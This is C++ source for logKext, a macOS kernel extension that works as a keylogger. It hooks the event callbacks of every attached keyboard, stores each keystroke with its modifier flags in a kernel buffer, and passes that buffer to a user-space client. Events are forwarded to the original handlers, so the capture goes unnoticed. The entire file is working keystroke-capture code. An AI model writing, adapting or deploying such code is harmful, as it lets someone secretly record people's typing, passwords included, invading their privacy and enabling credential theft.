/*
	logKext.cpp
	logKext

   Copyright 2007 Braden Thomas

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
*/

#include "logKext.h"
#include "logKextKeys.h"

#include <libkern/c++/OSCollection.h>

com_fsb_iokit_logKext		*logService;
KeyboardEventCallback			origCallback;
KeyboardSpecialEventCallback	origSpecialCallback;

#define super IOService

OSDefineMetaClassAndStructors(com_fsb_iokit_logKext, IOService);

bool com_fsb_iokit_logKext::termNotificationHandler(void *target, 
													void *ref, 
													IOService *newServ)
{
	com_fsb_iokit_logKext* self = OSDynamicCast( com_fsb_iokit_logKext, (OSMetaClassBase*)target );
	if (!self)
		return false;

	#ifdef LK_DEBUG
		IOLog( "%s::Termination Notification handler called\n", self->getName() );
	#endif

	if (!self->loggedKeyboards)
		return false;

	IOHIKeyboard*	keyboard = OSDynamicCast( IOHIKeyboard, newServ );
	if (!keyboard)
		return false;

	int index = self->loggedKeyboards->getNextIndexOfObject(keyboard,0);
	if (index>=0)
	{
		#ifdef LK_DEBUG
			IOLog( "%s::Removing keyboard %x\n", self->getName(),keyboard );
		#endif

		self->kextKeys--;
		self->loggedKeyboards->removeObject(index);
	}
	return true;
}


bool com_fsb_iokit_logKext::myNotificationHandler(void *target, 
													void *ref, 
													IOService *newServ)
{
	com_fsb_iokit_logKext* self = OSDynamicCast( com_fsb_iokit_logKext, (OSMetaClassBase*)target );
	if (!self)
		return false;

	#ifdef LK_DEBUG
		IOLog( "%s::Notification handler called\n", self->getName() );
	#endif

	IOHIKeyboard*	keyboard = OSDynamicCast( IOHIKeyboard, newServ );
	if (!keyboard)
		return false;
	
	if (!keyboard->_keyboardEventTarget)
	{
		#ifdef LK_DEBUG
			IOLog( "%s::No Keyboard event target\n", self->getName());
		#endif

		return false;
	}
	// event target must be IOHIDSystem
	
	IOService*	targetServ = OSDynamicCast( IOService, keyboard->_keyboardEventTarget );
	if (targetServ)
	{
		#ifdef LK_DEBUG
			IOLog( "%s::Keyboard event target is %s\n", self->getName(), targetServ->getName());
		#endif
	}
		
	if (!keyboard->_keyboardEventTarget->metaCast("IOHIDSystem"))
		return false;

	// we have a valid keyboard to be logged
	#ifdef LK_DEBUG
		IOLog( "%s::Adding keyboard %x\n", self->getName(),keyboard );
	#endif

	int index = self->loggedKeyboards->getNextIndexOfObject(keyboard,0);
	if (index<0)
	{	
		self->loggedKeyboards->setObject(keyboard);
		self->kextKeys++;
	}

	origCallback = (KeyboardEventCallback)keyboard->_keyboardEventAction;		// save the original action
	keyboard->_keyboardEventAction = (KeyboardEventAction) logAction;	// apply the new action

	origSpecialCallback = (KeyboardSpecialEventCallback)keyboard->_keyboardSpecialEventAction;		// save the original action
	keyboard->_keyboardSpecialEventAction = (KeyboardSpecialEventAction) specialAction;	// apply the new action

	return true;
}


bool com_fsb_iokit_logKext::start(IOService *provider)
{
	#ifdef LK_DEBUG
		IOLog( "%s::Starting\n", getName() );
	#endif
	
	origCallback = NULL;
	origSpecialCallback = NULL;
	buffsize = 0;
	kextKeys = 0;
	notify = NULL;
	bool result = super::start(provider);
	logService = this;
	
	loggedKeyboards = new OSArray();
	loggedKeyboards->initWithCapacity(1);
	
	fMemBuf = (unsigned char*)IOMalloc(MAX_BUFF_SIZE);	// allocate a buffer to store the characters
	if( !fMemBuf )
		return false;
				
	registerService();	// make us visible in the IORegistry for matching by IOServiceGetMatchingServices

	notifyTerm = addNotification(gIOTerminatedNotification,
							serviceMatching("IOHIKeyboard"), 
							(IOServiceNotificationHandler) &com_fsb_iokit_logKext::termNotificationHandler,
							this, 0);

	if(!result)	// if we failed for some reason
	{
		stop(provider);	// call stop to clean up
		return false;
	}
	
	#ifdef LK_DEBUG
		IOLog( "%s::Successfully started\n", getName() );
	#endif
	
	return true;
}

void com_fsb_iokit_logKext::clearKeyboards()
{
	#ifdef LK_DEBUG
		IOLog( "%s::Clear keyboards called with kextkeys %d!\n", getName(), kextKeys );
	#endif

	if (loggedKeyboards)
	{
		int arraySize = loggedKeyboards->getCount();
		for (int i=0; i<arraySize; i++)
		{
			IOHIKeyboard *curKeyboard = (IOHIKeyboard*)loggedKeyboards->getObject(0);

			if (origSpecialCallback)
				curKeyboard->_keyboardSpecialEventAction = (KeyboardSpecialEventAction)origSpecialCallback;
			if (origCallback)
				curKeyboard->_keyboardEventAction = (KeyboardEventAction)origCallback;
			
			loggedKeyboards->removeObject(0);
			kextKeys--;
		}
	}
	origSpecialCallback = NULL;
	origCallback = NULL;
	kextKeys=0;
}

void com_fsb_iokit_logKext::activate()
{

	notify = addNotification(gIOPublishNotification,
							serviceMatching("IOHIKeyboard"), 
							(IOServiceNotificationHandler) &com_fsb_iokit_logKext::myNotificationHandler,
							this, 0);

	#ifdef LK_DEBUG
		IOLog( "%s::Added notification for keyboard\n", getName() );
	#endif
	
	return;
}

void com_fsb_iokit_logKext::deactivate()
{
	if (notify)
		notify->remove();
	notify = NULL;
	
	clearKeyboards();
	
	#ifdef LK_DEBUG
		IOLog( "%s::Removed notification for keyboard\n", getName() );
	#endif
}


void com_fsb_iokit_logKext::stop(IOService *provider)
{

	if (notifyTerm)
		notifyTerm->remove();

	#ifdef LK_DEBUG
		IOLog( "%s::Stopping\n", getName() );
	#endif
	
	logService = NULL;
	
	deactivate();
	
	// clean up our IOMemoryDescriptor and buffer	
	if(fMemBuf)
	{
		IOFree(fMemBuf, MAX_BUFF_SIZE);
		fMemBuf = NULL;
	}

	loggedKeyboards->release();
            
	super::stop(provider);
}

/*
    Methods called from userland via the user client:
*/

IOReturn com_fsb_iokit_logKext::BuffandKeys( UInt32* size, UInt32* keys )
{
	*size = buffsize;
	*keys = kextKeys;

    return kIOReturnSuccess;
}

IOReturn com_fsb_iokit_logKext::Buffer( bufferStruct* inStruct )
{
	if(buffsize)
	{
			memcpy(inStruct->buffer, fMemBuf, buffsize);
			inStruct->bufLen = buffsize;
			buffsize = 0;
	}
	else
		inStruct->bufLen = 0;
	
    return kIOReturnSuccess;
}

void com_fsb_iokit_logKext::logStroke( unsigned key, unsigned flags, unsigned charCode )
{
	/*  changed to allow for dynamic key mappings:
			- Keys are transmitted to userspace as 2 byte half-words
			- The top 5 bits of the half-word indicate the flags
				the order from high to low is:
					case (Shift or Caps)
					ctrl
					alt
					cmd
					fn
			- The bottom 11 bits contain the key itself (2048 is plenty big)
	*/

	u_int16_t keyData = key;
	keyData &= 0x07ff;			// clear the top 5 bits
	
	if ((flags & CAPS_FLAG)||(flags & SHIFT_FLAG))
		keyData |= 0x8000;
	
	if (flags & CTRL_FLAG)
		keyData |= 0x4000;

	if (flags & ALT_FLAG)
		keyData |= 0x2000;

	if (flags & CMD_FLAG)
		keyData |= 0x1000;

	if (flags & FN_FLAG)
		keyData |= 0x0800;
	
	if (!buffsize)
		bzero(fMemBuf,MAX_BUFF_SIZE);

	#ifdef LK_DEBUG
		IOLog( "%s::Copying key %04x\n", getName(), keyData );
	#endif
	
	memcpy(fMemBuf+buffsize,&keyData,sizeof(keyData));
	buffsize+=sizeof(keyData);
		
	if (buffsize>(9*MAX_BUFF_SIZE/10))
	{
		#ifdef LK_DEBUG
			IOLog( "%s::Error: buffer overflow\n", getName() );
		#endif
		
		buffsize=0;
	}

}

void specialAction(OSObject * target,
                   /* eventType */        unsigned   eventType,
                   /* flags */            unsigned   flags,
                   /* keyCode */          unsigned   key,
                   /* specialty */        unsigned   flavor,
                   /* source id */        UInt64     guid,
                   /* repeat */           bool       repeat,
                   /* atTime */           AbsoluteTime ts,
                   OSObject * sender,
                   void * refcon __unused)
{
	if ((eventType==NX_SYSDEFINED)&&(!flags)&&(key==NX_NOSPECIALKEY))	// only sign of a logout (also thrown when sleeping)
		logService->clearKeyboards();

	if (origSpecialCallback)
		(*origSpecialCallback)(target,eventType,flags,key,flavor,guid,repeat,ts,sender,0);
}


void logAction(OSObject * target,
               /* eventFlags  */      unsigned   eventType,
               /* flags */            unsigned   flags,
               /* keyCode */          unsigned   key,
               /* charCode */         unsigned   charCode,
               /* charSet */          unsigned   charSet,
               /* originalCharCode */ unsigned   origCharCode,
               /* originalCharSet */  unsigned   origCharSet,
               /* keyboardType */     unsigned   keyboardType,
               /* repeat */           bool       repeat,
               /* atTime */           AbsoluteTime ts,
               OSObject * sender,
               void * refcon __unused)
{
	if ((eventType==NX_KEYDOWN)&&logService)
		logService->logStroke(key, flags, charCode);
	if (origCallback)
		(*origCallback)(target,eventType,flags,key,charCode,charSet,origCharCode,origCharSet,keyboardType,repeat,ts,sender,0);
}
